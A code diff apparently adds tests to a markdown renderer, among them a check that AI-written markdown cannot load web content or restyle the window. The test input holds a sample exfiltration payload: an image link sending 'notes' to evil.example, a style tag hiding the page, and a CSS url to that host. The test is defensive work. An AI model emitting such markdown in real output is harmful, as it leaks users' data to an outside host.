@@ -60,6 +60,8 @@ describe("renderMarkdownHtml", () => {
     expect(renderMarkdownHtml("[[a_b_c|<b>x</b>]]")).toContain(
       '<span class="wikilink">[[a_b_c|&lt;b&gt;x&lt;/b&gt;]]</span>',
     );
+    // `[[x]](url)` is a link whose text has brackets, as elsewhere.
+    expect(renderMarkdownHtml("[[x]](https://a.b)")).not.toContain("wikilink");
   });
 });
 
@@ -105,5 +107,17 @@ describe("renderDocumentHtml", () => {
     expect(doc.querySelector(".katex-html .katex-tag")?.textContent).toContain(
       "(A)",
     );
+  });
+});
+
+describe("what Textus AI writes", () => {
+  it("loads nothing from the web as it shows, and can't restyle the window", () => {
+    const html = renderMarkdownHtml(
+      '![secret](https://evil.example/?d=notes)\n\n<style>body{display:none}</style>\n\n<span style="background:url(https://evil.example/)">x</span>',
+    );
+    expect(html).not.toContain("<img");
+    expect(html).toContain('href="https://evil.example/?d=notes"');
+    expect(html).not.toContain("<style");
+    expect(html).not.toContain("url(");
   });
 });
